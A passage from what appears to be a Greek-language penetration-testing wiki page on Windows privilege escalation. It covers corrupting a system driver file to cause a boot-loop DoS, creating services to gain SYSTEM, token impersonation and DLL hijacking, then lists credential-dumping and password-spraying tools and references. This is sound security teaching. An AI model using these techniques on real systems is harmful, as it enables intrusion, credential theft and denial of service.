3. Περιμένετε να γράψει το log το προνομιούχο στοιχείο (π.χ. ο admin επιλέγει «αποστολή δοκιμαστικού SMS»). Η εγγραφή αποθηκεύεται πλέον στο `C:\Windows\System32\cng.sys`.
4. Εξετάστε τον στόχο που αντικαταστάθηκε (hex/PE parser) για να επιβεβαιώσετε την αλλοίωση· η επανεκκίνηση αναγκάζει τα Windows να φορτώσουν την παραποιημένη διαδρομή του driver → **boot loop DoS**. Αυτό ισχύει γενικά και για κάθε προστατευμένο αρχείο που θα ανοίξει για εγγραφή μια προνομιούχα υπηρεσία.

> Το `cng.sys` φορτώνεται συνήθως από το `C:\Windows\System32\drivers\cng.sys`, αλλά αν υπάρχει αντίγραφο στο `C:\Windows\System32\cng.sys`, μπορεί να δοκιμαστεί πρώτα, καθιστώντας το αξιόπιστο σημείο DoS για αλλοιωμένα δεδομένα.



## **Από High Integrity σε System**

### **Νέα υπηρεσία**

Αν εκτελείτε ήδη διεργασία High Integrity, η **διαδρομή προς το SYSTEM** μπορεί να είναι εύκολη: απλώς **δημιουργήστε και εκτελέστε μια νέα υπηρεσία**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Κατά τη δημιουργία ενός service binary, βεβαιωθείτε ότι είναι έγκυρο service ή ότι το binary εκτελεί γρήγορα τις απαραίτητες ενέργειες, καθώς θα τερματιστεί σε 20s αν δεν είναι έγκυρο service.

### AlwaysInstallElevated

Από μια διεργασία High Integrity μπορείτε να δοκιμάσετε να **ενεργοποιήσετε τις καταχωρίσεις μητρώου AlwaysInstallElevated** και να **εγκαταστήσετε** ένα reverse shell χρησιμοποιώντας ένα wrapper _**.msi**_.\
[Περισσότερες πληροφορίες για τα κλειδιά μητρώου που εμπλέκονται και για την εγκατάσταση ενός πακέτου _.msi_ εδώ.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Μπορείτε να** [**βρείτε τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Αν έχετε αυτά τα token privileges (πιθανότατα θα τα βρείτε σε μια διεργασία High Integrity), θα μπορείτε να **ανοίξετε σχεδόν οποιαδήποτε διεργασία** (εκτός από protected processes) με το SeDebug privilege, να **αντιγράψετε το token** της διεργασίας και να δημιουργήσετε μια **αυθαίρετη διεργασία με αυτό το token**.\
Με αυτήν την τεχνική συνήθως **επιλέγετε οποιαδήποτε διεργασία εκτελείται ως SYSTEM με όλα τα token privileges** (_ναι, μπορείτε να βρείτε διεργασίες SYSTEM χωρίς όλα τα token privileges_).\
**Μπορείτε να βρείτε ένα** [**παράδειγμα κώδικα που εκτελεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Αυτή η τεχνική χρησιμοποιείται από το meterpreter για κλιμάκωση δικαιωμάτων στο `getsystem`. Η τεχνική συνίσταται στη **δημιουργία ενός pipe και έπειτα στη δημιουργία/κατάχρηση ενός service για εγγραφή σε αυτό το pipe**. Στη συνέχεια, ο **server** που δημιούργησε το pipe χρησιμοποιώντας το privilege **`SeImpersonate`** θα μπορεί να **πλαστοπροσωπήσει το token** του pipe client (του service), αποκτώντας δικαιώματα SYSTEM.\
Αν θέλετε να [**μάθετε περισσότερα για τα name pipes, διαβάστε αυτό**](#named-pipe-client-impersonation).\
Αν θέλετε να διαβάσετε ένα παράδειγμα για το [**πώς να μεταβείτε από high integrity σε System χρησιμοποιώντας name pipes, διαβάστε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Αν καταφέρετε να **κάνετε hijack ένα dll** που **φορτώνεται** από μια **διεργασία** που εκτελείται ως **SYSTEM**, θα μπορείτε να εκτελέσετε αυθαίρετο κώδικα με αυτά τα δικαιώματα. Επομένως, το Dll Hijacking είναι επίσης χρήσιμο για αυτό το είδος κλιμάκωσης δικαιωμάτων και, επιπλέον, είναι **πολύ πιο εύκολο να επιτευχθεί από μια διεργασία high integrity**, καθώς αυτή θα έχει **δικαιώματα εγγραφής** στους φακέλους που χρησιμοποιούνται για τη φόρτωση dlls.\
**Μπορείτε να** [**μάθετε περισσότερα για το Dll hijacking εδώ**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Διαβάστε:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Χρήσιμα εργαλεία

**Το καλύτερο εργαλείο για την αναζήτηση vectors τοπικής κλιμάκωσης δικαιωμάτων στα Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Έλεγχος για εσφαλμένες ρυθμίσεις και ευαίσθητα αρχεία (**[**δείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Εντοπίστηκε.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Έλεγχος για πιθανές εσφαλμένες ρυθμίσεις και συλλογή πληροφοριών (**[**δείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Έλεγχος για εσφαλμένες ρυθμίσεις**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει αποθηκευμένες πληροφορίες συνεδριών των PuTTY, WinSCP, SuperPuTTY, FileZilla και RDP. Χρησιμοποιήστε το -Thorough σε τοπικό περιβάλλον.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει διαπιστευτήρια από το Credential Manager. Εντοπίστηκε.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Δοκιμάζει τα συλλεγμένα passwords σε όλο το domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Το Inveigh είναι ένα εργαλείο PowerShell για ADIDNS/LLMNR/mDNS spoofing και man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Βασική απαρίθμηση Windows για privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Αναζήτηση γνωστών ευπαθειών privesc (DEPRECATED, αντικαταστάθηκε από το Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Τοπικοί έλεγχοι **(Απαιτούνται δικαιώματα Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζήτηση γνωστών ευπαθειών privesc (πρέπει να γίνει compile με VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Απαριθμεί το host αναζητώντας εσφαλμένες ρυθμίσεις (περισσότερο εργαλείο συλλογής πληροφοριών παρά εργαλείο privesc) (πρέπει να γίνει compile) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει διαπιστευτήρια από πολλά λογισμικά (precompiled exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Έλεγχος για εσφαλμένες ρυθμίσεις (precompiled εκτελέσιμο στο github). Δεν συνιστάται. Δεν λειτουργεί καλά στα Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Έλεγχος για πιθανές εσφαλμένες ρυθμίσεις (exe από python). Δεν συνιστάται. Δεν λειτουργεί καλά στα Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Εργαλείο που δημιουργήθηκε με βάση αυτήν την ανάρτηση (δεν χρειάζεται accesschk για να λειτουργήσει σωστά, αλλά μπορεί να το χρησιμοποιήσει).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει λειτουργικά exploits (τοπικό python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει λειτουργικά exploits (τοπικό Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Πρέπει να κάνετε compile το project χρησιμοποιώντας τη σωστή έκδοση του .NET ([δείτε αυτό](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Για να δείτε την εγκατεστημένη έκδοση του .NET στο victim host, μπορείτε να εκτελέσετε:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Βασικές αρχές Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Απόκτηση αυξημένων προνομίων μέσω εκμετάλλευσης ανεπαρκών δικαιωμάτων φακέλων](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - συνοπτικός οδηγός](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Εργαστήριο Local Privilege Escalation σε Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Επιθέσεις στα Windows: Το AT είναι το νέο μαύρο (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Πλήρης οδηγός OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Οδηγός Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Λίστα ελέγχου Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Μέθοδοι Windows Privilege Escalation για Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing με Word VBA macro μέσω SMTP → αποκρυπτογράφηση διαπιστευτηρίων hMailServer → Veeam CVE-2023-27532 για SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak μέσω format string + stack BOF → VirtualAlloc ROP (RCE) και κλοπή kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Κυνηγώντας την Ασημένια Αλεπού: Γάτα και ποντίκι στις σκιές του kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ευπάθεια σε προνομιούχο σύστημα αρχείων σε σύστημα SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Εργαλεία δοκιμής συμβολικών συνδέσμων – χρήση του CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Ένας σύνδεσμος από το παρελθόν. Κατάχρηση συμβολικών συνδέσμων στα Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (port του Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Επικίνδυνη επίλυση modules στα Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Modules του Node.js: φόρτωση από φακέλους `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Προκλήσεις λίστας ελέγχου C/C++, λυμένες](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Συνάρτηση RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Υφαρπαγή εκτελέσιμων αρχείων υπηρεσιών](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own με το Microslop: Συνδυασμός συνθηκών ανταγωνισμού CLDFLT και DirectX Kernel για Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ένα I/O Ring για να τους κυβερνά όλους: Πλήρης primitive exploit ανάγνωσης/εγγραφής στα Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Κατάχρηση αυθαίρετων διαγραφών αρχείων για κλιμάκωση προνομίων και άλλα χρήσιμα κόλπα](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Κώδικας exploit για FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Επιθέσεις WSUS, Μέρος 2: CVE-2020-1013, Local Privilege Escalation 1-Day στα Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Εξερευνώντας το Credential Manager και το Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC για CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Όταν μια αλλαγή εικόνας οδηγεί σε κλιμάκωση προνομίων](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Εξαγωγή ιδιωτικών κλειδιών SSH από το SSH agent των Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Μετατρέποντας τους εταιρικούς update servers σε εργοστάσια backdoor (0_o) – Μέρος 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Μετατρέποντας τους εταιρικούς update servers σε εργοστάσια backdoor (0_o) – Μέρος 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Κλιμάκωση προνομίων μέσω διαγραφής φακέλου του Microsoft Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
